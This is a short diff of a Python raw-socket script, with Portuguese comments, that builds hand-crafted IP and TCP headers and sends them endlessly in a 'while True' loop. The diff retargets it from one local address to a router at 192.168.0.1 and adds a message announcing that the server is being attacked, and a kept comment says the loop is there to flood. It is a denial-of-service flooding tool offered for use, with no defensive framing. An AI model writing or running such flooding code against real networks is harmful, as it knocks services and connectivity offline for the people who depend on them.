@@ -30,8 +30,8 @@ s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
 packet = '';
  
 #atacando proprio roteador
-source_ip = '192.168.1.101'
-dest_ip = '192.168.1.101' # or socket.gethostbyname('www.google.com')
+source_ip = '192.168.0.18'
+dest_ip = '192.168.0.1' # or socket.gethostbyname('www.google.com')
  
 # ip header fields
 ihl = 5
@@ -93,7 +93,7 @@ tcp_header = pack('!HHLLBBHHH' , source, dest, seq, ack_seq, offset_res, tcp_fla
 packet = ip_header + tcp_header
  
 #Send the packet finally - the port specified has no effect
-
+print 'O servidor',dest_ip,'esta sendo atacado'
  
 #put the above line in a loop like while 1: if you want to flood
 while True:
